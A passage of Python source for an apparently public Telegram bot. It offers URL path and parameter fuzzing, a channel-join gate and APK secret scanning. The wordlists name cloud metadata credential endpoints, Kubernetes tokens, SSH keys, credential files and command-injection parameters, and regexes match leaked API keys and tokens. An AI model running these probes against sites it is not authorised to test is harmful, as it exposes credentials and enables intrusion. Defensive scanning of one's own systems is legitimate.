    # ── AWS / Cloud ────────────────────────────────
    "latest/meta-data/","latest/user-data/",
    "_ah/health","_ah/warmup",  # GCP App Engine
    "healthz","readyz","livez",  # k8s
    "__version__","__heartbeat__","__lbheartbeat__",
    # ── V24: Additional sensitive paths ───────────────
    "api/private","api/internal","api/secret","api/hidden",
    "api/test","api/dev","api/beta","api/debug","api/sandbox",
    "internal","internal/","internal/api","internal/admin",
    "private","private/","hidden","secret","secret/",
    "old","old/","legacy","legacy/","deprecated","deprecated/",
    "v0","v0/","v1/","v2/","v3/","v4/","v5/",
    "2021","2022","2023","2024","2025",
    "backup.tar.gz.1","backup.old","site_backup.zip","db_backup.sql",
    "dump.tar.gz","mysql_backup.sql","postgres_backup.sql",
    "prod_backup.zip","staging_backup.zip","deploy.sh","install.sh",
    "setup.sh","migrate.sh","seed.sh","reset.sh","bootstrap.sh",
    "cron.php","cron/","queue.php","worker.php","daemon.php",
    "api/cron","api/queue","api/worker","api/jobs","api/batch",
    # AWS/Cloud metadata & IAM
    "latest/meta-data/hostname","latest/meta-data/iam/security-credentials/",
    "latest/meta-data/local-ipv4","latest/meta-data/public-ipv4",
    ".aws/credentials",".azure/config",".gcp/credentials.json",
    "gcloud/credentials.db","gcloud/legacy_credentials/",
    # Kubernetes secrets
    "var/run/secrets/kubernetes.io/serviceaccount/token",
    "var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    # SSH / certificates
    "id_dsa","id_ecdsa","id_ed25519","ca.key","ca.crt","server.key","server.crt",
    "private.pem","privkey.pem","privkey.key","keystore.jks","keystore.p12",
    # Cloud / IaC
    ".terraform/terraform.tfstate","terraform.tfvars.backup",
    "ansible/hosts","ansible/inventory","ansible.cfg","inventory.yml",
    "helm/values.yaml","chart/values.yaml","k8s/secrets.yaml",
    "kubernetes/secrets.yaml","manifests/secrets.yaml",
    # Token/secret dumps
    ".npmrc","npm-debug.log",".yarnrc",".yarnrc.yml",
    ".pip/pip.conf","pip.conf","pip.ini",
    ".m2/settings.xml","settings.xml",
    ".gradle/gradle.properties","gradle.properties",
    ".cargo/credentials","Cargo.lock",
    # Test/seed data
    "test/fixtures","test/data","spec/fixtures","tests/fixtures",
    "database/seeders","database/seeds","db/seeds","db/fixtures",
    "fixtures","fixtures.json","seed.json","demo_data.sql",
    # Package managers / lock files
    "Gemfile.lock","Pipfile.lock","poetry.lock","requirements.txt",
    "mix.lock","rebar.lock","shard.lock",
    "go.sum","go.mod","Cargo.toml",
]

_FUZZ_PARAMS = [
    # ── Common / IDOR ──────────────────────────────
    "id","uid","user_id","userid","account_id","order_id","product_id",
    "item_id","post_id","page_id","category_id","group_id","org_id",
    "file_id","doc_id","ref","reference","record","object","resource",
    # ── Input / Injection ─────────────────────────
    "q","query","search","keyword","term","text","input","data","payload",
    "cmd","exec","command","run","shell","eval","expression","code",
    "sql","filter","where","sort","order","by","limit","offset","page","per_page",
    # ── File / Path ────────────────────────────────
    "file","filename","filepath","path","dir","directory","folder",
    "url","uri","link","href","src","source","include","require","load",
    "template","view","layout","page","module","component","class",
    "redirect","next","return","return_url","callback","goto","continue",
    "back","redir","destination","target","forward","location",
    # ── User ───────────────────────────────────────
    "user","username","uname","name","email","mail","login","password",
    "pass","passwd","pwd","new_password","confirm_password",
    "first_name","last_name","fullname","display_name","nickname",
    # ── Auth / Session ─────────────────────────────
    "token","access_token","refresh_token","auth_token","session_token",
    "api_key","apikey","key","secret","secret_key","private_key",
    "client_id","client_secret","app_id","app_key","app_secret",
    "code","state","nonce","csrf","_csrf","csrf_token","xsrf",
    "hash","sig","signature","hmac","digest","checksum",
    "session","session_id","sid","auth","authorization","bearer",
    # ── Admin / Priv ───────────────────────────────
    "admin","is_admin","role","roles","permissions","privilege","level",
    "debug","test","dev","internal","hidden","mode","flag","feature",
    "bypass","skip","override","force","sudo",
    # ── Format / Output ────────────────────────────
    "format","output","type","content_type","accept","lang","language",
    "locale","timezone","tz","charset","encoding","version","v",
    "fields","columns","attributes","expand","include","exclude","select",
    "action","method","op","operation","task","job","event","trigger",
    # ── Tracking ──────────────────────────────────
    "utm_source","utm_medium","utm_campaign","ref","referrer","aff",
    "affiliate","promo","coupon","voucher","discount",
]

def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
    """Run path or parameter fuzzing — profile-aware wordlist & delay."""
    found = []

    # ── Reuse or build SiteProfile ────────────────
    domain  = urlparse(base).netloc
    profile = _PROFILE_CACHE.get(domain) or detect_site_profile(base)

    # ── Profile-aware wordlist + settings ─────────
    fuzz_workers = 15
    fuzz_delay   = 0.0

    if profile.is_cloudflare or profile.has_waf:
        fuzz_workers = 5
        fuzz_delay   = 0.3
    elif profile.is_wordpress or profile.is_shopify:
        fuzz_workers = 8
        fuzz_delay   = 0.1

    # CMS-specific extra paths
    extra_paths = []
    if profile.is_wordpress:
        extra_paths += [
            "wp-login.php", "wp-config.php", "wp-config.php.bak",
            "wp-content/debug.log", "wp-content/uploads",
            "wp-json/wp/v2/users", "wp-json/wp/v2/posts",
            "xmlrpc.php", "wp-cron.php", "wp-trackback.php",
            "wp-content/themes", "wp-content/plugins",
            ".htpasswd", "wp-includes/wlwmanifest.xml",
        ]
    if profile.is_shopify:
        extra_paths += [
            "products.json", "collections.json", "pages.json",
            "cart.js", "search.json",
            "collections/all/products.json",
            "admin", "account", "account/login",
        ]
    if profile.is_spa:
        extra_paths += [
            "api/graphql", "graphql", "api/v1", "api/v2",
            "api/auth/login", "api/me", "api/config",
            "static/js/main.chunk.js", "asset-manifest.json",
            "service-worker.js", "manifest.json", "robots.txt",
        ]

    # Build final wordlist — CMS-specific paths first
    if mode == "params":
        wordlist = _FUZZ_PARAMS
        targets  = [f"{base}?{p}=FUZZ" for p in wordlist]
    else:
        combined  = extra_paths + [p for p in _FUZZ_PATHS if p not in extra_paths]
        wordlist  = combined
        targets   = [f"{base.rstrip('/')}/{p}" for p in wordlist]

    progress_q.append(
        f"🧪 *{profile.profile_name}* mode\n"
        f"📋 `{len(targets)}` paths | ×`{fuzz_workers}` workers"
        + (f" | `{fuzz_delay}s` delay" if fuzz_delay else "")
    )

    # ── Baseline: get 404 fingerprint ───────────────
    try:
        r404 = requests.get(
            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
            timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_size   = len(r404.content)
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
    except Exception:
        baseline_status, baseline_size, baseline_hash = 404, 0, ""

    def _is_interesting(r_status, r_size, r_hash):
        """Filter out baseline 404 catch-all responses."""
        if r_status == baseline_status:
            if r_hash and r_hash == baseline_hash:
                return False
            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
                return False
        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)

    def _probe(target_url):
        try:
            r = requests.get(
                target_url, timeout=5, verify=False, headers=_get_headers(),
                allow_redirects=True, stream=True
            )
            chunk = b""
            for part in r.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            r.close()
            r_size = int(r.headers.get("Content-Length", len(chunk)))
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_ct   = r.headers.get("Content-Type","")[:30]
            if _is_interesting(r.status_code, r_size, r_hash):
                if fuzz_delay > 0:
                    time.sleep(fuzz_delay)
                return {
                    "url":    target_url,
                    "status": r.status_code,
                    "size":   r_size,
                    "ct":     r_ct,
                    "title":  "",
                }
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=fuzz_workers) as ex:
        fmap = {ex.submit(_probe, t): t for t in targets}
        try:
            for fut in concurrent.futures.as_completed(fmap, timeout=120):
                done += 1
                if done % 20 == 0:
                    progress_q.append(
                        f"🧪 Fuzzing... `{done}/{len(targets)}` tested | `{len(found)}` found"
                    )
                try:
                    res = fut.result(timeout=8)
                    if res:
                        found.append(res)
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in fmap:
                f.cancel()
            progress_q.append(f"⚠️ Fuzz timeout — partial: `{done}/{len(targets)}` | `{len(found)}` found")

    found.sort(key=lambda x: (x["status"] != 200, x["status"]))
    return found, baseline_status


async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Fuzzing"
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
            "🧪 *Path mode detects:*\n"
            "  • Hidden admin panels & login pages\n"
            "  • Backup & config files (.env, .sql, .bak)\n"
            "  • Debug endpoints & info disclosure\n"
            "  • Framework internals (Actuator, GraphQL...)\n"
            "  • Log files & source leaks\n\n"
            "🔬 *Param mode detects:*\n"
            "  • Active query parameters\n"
            "  • Open redirect parameters\n"
            "  • Debug/admin param flags\n\n"
            "✅ Baseline fingerprinting to eliminate false positives\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    mode = context.args[1].lower() if len(context.args) > 1 and context.args[1].lower() in ('paths','params') else 'paths'

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain   = urlparse(url).hostname
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    wordlist = _FUZZ_PATHS if mode == 'paths' else _FUZZ_PARAMS

    msg = await update.effective_message.reply_text(
        f"🧪 *Fuzzing `{domain}`* [{mode}]\n"
        f"Wordlist: `{len(wordlist)}` entries\n"
        "Baseline fingerprinting active...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🧪 *Fuzzing `{domain}`* [{mode}]\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        found, baseline_st = await asyncio.to_thread(
            _fuzz_sync, base_url if mode == 'paths' else url, mode, progress_q
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        _active_scans.pop(uid, None)
        prog.cancel()

    st_icons = {
        200:"✅", 201:"✅", 204:"✅",
        301:"↪️", 302:"↩️", 307:"🔄",
        401:"🔑", 403:"🔒", 500:"💥"
    }
    risk_words = {
        "paths": ['backup','.env','admin','config','debug','.sql','.bak',
                   'password','secret','credential','id_rsa','passwd','shadow',
                   'actuator','phpinfo','phpmyadmin','adminer'],
        "params": ['cmd','exec','command','file','path','url','redirect',
                   'include','require','load','src'],
    }

    lines = [
        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
        f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
    ]

    if not found:
        lines.append("🔒 Nothing found — well hardened!")
    else:
        # Categorize
        critical = [r for r in found if r["status"] == 200 and
                    any(w in r["url"].lower() for w in risk_words.get(mode, []))]
        normal   = [r for r in found if r not in critical]

        if critical:
            lines.append(f"*🔴 High-Risk ({len(critical)}):*")
            for item in critical[:10]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            lines.append("")

        if normal:
            lines.append(f"*🟡 Interesting ({len(normal)}):*")
            for item in normal[:20]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            if len(normal) > 20:
                lines.append(f"  _…{len(normal)-20} more in report_")

    lines.append("\n⚠️ _Passive fuzzing. No exploitation._")

    # ── Always export JSON report ──────────────────
    import io as _io
    report = json.dumps({
        "target": url, "mode": mode, "domain": domain,
        "scanned_at": datetime.now().isoformat(),
        "baseline_status": baseline_st,
        "wordlist_size": len(wordlist),
        "findings_count": len(found),
        "findings": [{
            "url":    r["url"],
            "path":   r["url"].replace(base_url,""),
            "status": r["status"],
            "size":   r["size"],
            "content_type": r["ct"],
            "high_risk": any(w in r["url"].lower() for w in risk_words.get(mode,[])),
        } for r in found],
    }, indent=2)

    tg_text = "\n".join(lines)
    try:
        await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    buf = _io.BytesIO(report.encode())
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=buf,
        filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
        caption=(
            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
            f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
            f"Wordlist: `{len(wordlist)}` entries"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
# ══════════════════════════════════════════════════
# DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
# Admin IDs always bypass — no check needed.

async def _get_force_channels(db: dict) -> list:
    return db.get("settings", {}).get("force_channels", [])

async def check_force_join(update: Update, context) -> bool:
    """
    Returns True if user is allowed to proceed.
    Admin always passes. Regular users must be member of all force channels.
    """
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True  # Admin — always free

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)
    if not channels:
        return True  # No force join configured — allow all

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        return True

    # Build join buttons
    kb = []
    for ch in not_joined:
        label = ch if ch.startswith('@') else f"Channel"
        invite_link = ch if ch.startswith('@') else ch
        kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])

    await update.effective_message.reply_text(
        "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
        "အောက်ပါ Channel(s) ကို Join ပြီးမှ ဆက်လုပ်ပါ:\n\n"
        + "\n".join(f"  • {ch}" for ch in not_joined),
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode='Markdown'
    )
    return False


async def force_join_callback(update: Update, context) -> None:
    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        try:
            await query.edit_message_text(
                "✅ *စစ်ဆေးမှု အောင်မြင်ပါပြီ!*\n\n"
                "Bot ကို အခုသုံးလို့ ရပါပြီ 🎉\n"
                "/start ကို နှိပ်ပါ",
                parse_mode='Markdown'
            )
        except BadRequest:
            pass  # Message already same content — ignore
    else:
        kb = []
        for ch in not_joined:
            kb.append([InlineKeyboardButton(
                f"📢 {ch} ကို Join လုပ်ပါ",
                url=f"https://t.me/{ch.lstrip('@')}"
            )])
        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
        new_text = (
            "❌ *မပြည့်စုံသေးပါ*\n\n"
            "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
            + "\n".join(f"  • {ch}" for ch in not_joined)
        )
        try:
            await query.edit_message_text(
                new_text,
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode='Markdown'
            )
        except BadRequest:
            # Message not modified (same channels) — just answer silently
            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)


async def appassets_cat_callback(update: Update, context) -> None:
    """Callback for /appassets category selection buttons."""
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data  # apa_images / apa_all / etc.

    cat = data[4:]  # strip "apa_"
    valid_cats = set(_ASSET_CATEGORIES.keys())

    if cat == "all":
        wanted_cats = valid_cats.copy()
    elif cat in valid_cats:
        wanted_cats = {cat}
    else:
        await query.edit_message_text("❌ Unknown category")
        return

    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await query.edit_message_text(
            "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
        )
        return

    await query.edit_message_text(
        f"📦 Extracting `{', '.join(sorted(wanted_cats))}` from `{os.path.basename(last_app)}`...\n⏳"
    )
    # Pass query.message as the "update" target for _do_appassets_extract
    await _do_appassets_extract(query, context, last_app, wanted_cats)


@admin_only
async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setforcejoin @channel1 @channel2 ... | /setforcejoin off"""
    if not context.args:
        async with db_lock:
            db = _load_db_sync()
        chs = await _get_force_channels(db)
        await update.effective_message.reply_text(
            "📢 *Force Join Settings*\n\n"
            f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
            "Usage:\n"
            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
            "`/setforcejoin off` — ပိတ်မည်\n\n"
            "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if context.args[0].lower() == "off":
            db["settings"]["force_channels"] = []
            _save_db_sync(db)
            await update.effective_message.reply_text("✅ Force Join ပိတ်လိုက်ပါပြီ")
            return
        channels = [a if a.startswith('@') else '@' + a for a in context.args]
        db["settings"]["force_channels"] = channels
        _save_db_sync(db)

    await update.effective_message.reply_text(
        f"✅ *Force Join set လုပ်ပြီး*\n\n"
        f"Channels: {', '.join(f'`{c}`' for c in channels)}\n\n"
        "Users တွေ join မလုပ်ရင် Bot သုံးခွင့် မရတော့ပါ\n"
        "⚠️ Bot ကို အဆိုပါ channel(s) မှာ admin အဖြစ် ထည့်ထားဖို့ မမေ့နဲ့",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
# ══════════════════════════════════════════════════

_ASSET_CATEGORIES = {
    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
    "layouts":  {'.xml'},
    "dex":      {'.dex'},
    "so_libs":  {'.so'},
    "fonts":    {'.ttf','.otf','.woff','.woff2'},
    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
    "scripts":  {'.js','.py','.sh','.rb','.php'},
    "docs":     {'.pdf','.txt','.md','.html','.htm'},
    "archives": {'.zip','.tar','.gz','.rar','.7z'},
}

def _categorize_asset(filename: str) -> str:
    ext = os.path.splitext(filename.lower())[1]
    for cat, exts in _ASSET_CATEGORIES.items():
        if ext in exts:
            return cat
    return "other"

def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
    """Extract assets from APK/IPA/ZIP by category."""
    result = {"files": {}, "stats": {}, "errors": []}

    if not zipfile.is_zipfile(filepath):
        result["errors"].append("Not a valid ZIP/APK/IPA file")
        return result

    with zipfile.ZipFile(filepath, 'r') as zf:
        names = zf.namelist()
        total = len(names)
        categorized = {}
        for name in names:
            cat = _categorize_asset(name)
            if cat in wanted_cats:
                categorized.setdefault(cat, []).append(name)

        result["stats"]["total_files"] = total
        for cat, files in categorized.items():
            result["stats"][cat] = len(files)

        # Extract to BytesIO zip
        import io
        out_buf = io.BytesIO()
        extracted = 0
        MAX_EXTRACT = 200  # max files per export
        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
            for cat in wanted_cats:
                files = categorized.get(cat, [])
                for i, fname in enumerate(files[:MAX_EXTRACT]):
                    try:
                        data = zf.read(fname)
                        # Flatten long paths
                        short_name = f"{cat}/{os.path.basename(fname)}"
                        out_zf.writestr(short_name, data)
                        extracted += 1
                        if progress_cb and extracted % 20 == 0:
                            progress_cb(f"📦 Extracting... `{extracted}` files")
                    except Exception as e:
                        result["errors"].append(f"{fname}: {e}")

        result["extracted"] = extracted
        result["zip_buffer"] = out_buf
    return result





# ══════════════════════════════════════════════════
# 📱  APP / APK / IPA / ZIP ANALYZER (Enhanced v2.0)
# ══════════════════════════════════════════════════

class APKMetadataExtractor:
    """AndroidManifest.xml ကနေ အသုံးဝင်သောအချက်အလက် ကောက်ယူခြင်း"""
    
    def __init__(self, apk_path: str):
        self.apk_path = apk_path
        self.manifest_data = {}
        self.parsed = False
    
    def parse_manifest(self) -> Dict:
        """AndroidManifest.xml ကွဲခွာခြင်း"""
        try:
            with zipfile.ZipFile(self.apk_path, 'r') as zf:
                if 'AndroidManifest.xml' in zf.namelist():
                    manifest_bytes = zf.read('AndroidManifest.xml')
                    self.manifest_data = self._decode_binary_xml(manifest_bytes)
                    self.parsed = True
        except Exception as e:
            self.manifest_data = {"error": str(e)}
        
        return self.manifest_data
    
    def _decode_binary_xml(self, data: bytes) -> Dict:
        """Binary Android XML format ကုတ်စာ ပြန်လည်ခွဲခြင်း"""
        if not data or len(data) < 8:
            return {}
        
        result = {
            "package": "",
            "version_code": "",
            "version_name": "",
            "min_sdk": None,
            "target_sdk": None,
            "max_sdk": None,
            "debuggable": False,
            "permissions": [],
            "uses_features": [],
            "activities": [],
            "services": [],
            "receivers": [],
            "providers": [],
            "intent_filters": defaultdict(list),
        }
        
        try:
            # Package name ရှာခြင်း
            pkg_match = re.search(rb'package="([^"]+)"', data)
            if pkg_match:
                result["package"] = pkg_match.group(1).decode('utf-8', errors='ignore')
            
            # Version
            v_code = re.search(rb'versionCode="(\d+)"', data)
            v_name = re.search(b'versionName="([^"]*)"', data)
            if v_code:
                result["version_code"] = v_code.group(1).decode('utf-8', errors='ignore')
            if v_name:
                result["version_name"] = v_name.group(1).decode('utf-8', errors='ignore')
            
            # SDK versions
            min_sdk = re.search(rb'minSdkVersion=(?:"(\d+)"|[^>]*?value="(\d+)")', data)
            target_sdk = re.search(rb'targetSdkVersion=(?:"(\d+)"|[^>]*?value="(\d+)")', data)
            max_sdk = re.search(rb'maxSdkVersion=(?:"(\d+)"|[^>]*?value="(\d+)")', data)
            
            if min_sdk:
                result["min_sdk"] = int((min_sdk.group(1) or min_sdk.group(2) or b'0').decode())
            if target_sdk:
                result["target_sdk"] = int((target_sdk.group(1) or target_sdk.group(2) or b'0').decode())
            if max_sdk:
                result["max_sdk"] = int((max_sdk.group(1) or max_sdk.group(2) or b'0').decode())
            
            # Debuggable flag
            if b'android:debuggable="true"' in data:
                result["debuggable"] = True
            
            # Permissions
            for match in re.finditer(rb'<uses-permission[^>]*android:name="([^"]+)"', data):
                perm = match.group(1).decode('utf-8', errors='ignore')
                result["permissions"].append(perm)
            
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        
        return result
    
    def extract_certificate_info(self) -> List[Dict]:
        """Certificate အချက်အလက် ကောက်ယူခြင်း"""
        certs = []
        try:
            with zipfile.ZipFile(self.apk_path, 'r') as zf:
                for cert_file in zf.namelist():
                    if 'META-INF' in cert_file and (cert_file.endswith('.RSA') or cert_file.endswith('.EC')):
                        cert_data = zf.read(cert_file)
                        certs.append({
                            "file": cert_file,
                            "size": len(cert_data),
                            "type": "RSA" if ".RSA" in cert_file else "EC",
                        })
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        
        return certs


# ══════════════════════════════════════════════════════════════════════════
# 2️⃣  BINARY STRING EXTRACTION — DEX ထဲက Strings
# ══════════════════════════════════════════════════════════════════════════

class BinaryStringExtractor:
    """DEX ဖိုင်ထဲက အဓိက string တွေ ကောက်ယူခြင်း"""
    
    SECRET_PATTERNS = {
        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
        "AWS Access Key": r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key": r"aws_secret_access_key\s*=\s*['\"]([^'\"]{20,})['\"]",
        
        "Firebase Project": r"['\"]https://[a-z0-9-]+\.firebaseio\.com['\"]",
        "Firebase Config": r"\"projectId\":\s*\"([^\"]+)\"",
        
        "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24,}",
        "Stripe Test Key": r"sk_test_[0-9a-zA-Z]{24,}",
        
        "Slack Token": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[0-9a-zA-Z]{24,32}",
        "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
        
        "MongoDB URI": r"mongodb(\+srv)?://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
        "MySQL Connection": r"mysql://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
        "PostgreSQL": r"postgresql://[^\s\"\']+(:[^\s\"\']+)?@[^\s\"\']+",
        
        "Private Key": r"-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY",
        "JWT Token": r"eyJ[A-Za-z0-9_\-\.]{20,}",
        
        "Hardcoded Password": r"(password|passwd|pwd|secret|api_key)\s*[=:]\s*['\"]([^'\"]{5,})['\"]",
        
        "IP Address": r"\b(?:192\.168|10\.|172\.(?:1[6-9]|2[0-9]|3[01]))\.\d{1,3}\.\d{1,3}\b",
        "Localhost": r"(localhost|127\.0\.0\.1):(\d+)",
        
        "Tor Hidden Service": r"[a-z2-7]{16,56}\.onion",
    }
    
    @staticmethod
    def extract_from_dex(apk_path: str, progress_callback: Callable = None) -> Dict:
        """DEX ဖိုင်ထဲက string တွေ ကောက်ယူခြင်း"""
        
        results = {
            "urls": set(),
            "api_endpoints": set(),
            "domains": set(),
            "secrets": defaultdict(list),
            "suspicious_strings": [],
            "hardcoded_ips": set(),
            "websocket_urls": set(),
        }
        
        try:
            with zipfile.ZipFile(apk_path, 'r') as zf:
                dex_files = [f for f in zf.namelist() if f.endswith('.dex')]
                
                if progress_callback:
                    progress_callback(f"🔍 Found `{len(dex_files)}` DEX files")
                
                for dex_idx, dex_file in enumerate(dex_files):
                    if progress_callback:
                        progress_callback(f"📖 Parsing {dex_idx+1}/{len(dex_files)}: `{dex_file}`")
                    
                    dex_data = zf.read(dex_file)
                    strings = BinaryStringExtractor._extract_strings_from_dex(dex_data)
                    
                    for string in strings:
                        # URLs
                        if string.startswith(('http://', 'https://', 'ws://', 'wss://')):
                            results["urls"].add(string)
                            if 'ws' in string:
                                results["websocket_urls"].add(string)
                            try:
                                from urllib.parse import urlparse
                                domain = urlparse(string).netloc
                                if domain:
                                    results["domains"].add(domain)
                            except Exception:
                                pass
                        
                        # API paths
                        if string.startswith('/api/'):
                            results["api_endpoints"].add(string)
                        
                        # Secrets
                        for secret_name, pattern in BinaryStringExtractor.SECRET_PATTERNS.items():
                            if re.search(pattern, string, re.IGNORECASE):
                                results["secrets"][secret_name].append(string[:80])
                        
                        # Suspicious
                        if any(keyword in string.lower() for keyword in 
                               ['password', 'secret', 'token', 'key', 'credential']):
                            if len(string) > 8:
                                results["suspicious_strings"].append(string[:60])
        
        except Exception as e:
            if progress_callback:
                progress_callback(f"⚠️ Error extracting DEX: `{e}`")
        
        return results
    
    @staticmethod
    def _extract_strings_from_dex(dex_data: bytes) -> List[str]:
        """DEX string pool ကွဲခွာခြင်း"""
        strings = []
        
        try:
            current_string = b''
            for byte in dex_data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current_string += bytes([byte])
                elif byte == 0 and len(current_string) > 3:
                    try:
                        strings.append(current_string.decode('utf-8', errors='ignore'))
                    except Exception:
                        pass
                    current_string = b''
                elif byte > 126:
                    if len(current_string) > 3:
                        try:
                            strings.append(current_string.decode('utf-8', errors='ignore'))
                        except Exception:
                            pass
                    current_string = b''
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        
        return strings


# ══════════════════════════════════════════════════════════════════════════
# 3️⃣  PERMISSION RISK ANALYSIS
# ══════════════════════════════════════════════════════════════════════════

class PermissionRiskAnalyzer:
    """ခွင့်ခြင်းများ၏ အန္တရာယ်ကို အဆင့်ခွဲခြည်း"""
    
    RISK_LEVELS = {
        "CRITICAL": [
            "android.permission.WRITE_SECURE_SETTINGS",
            "android.permission.INSTALL_PACKAGES",
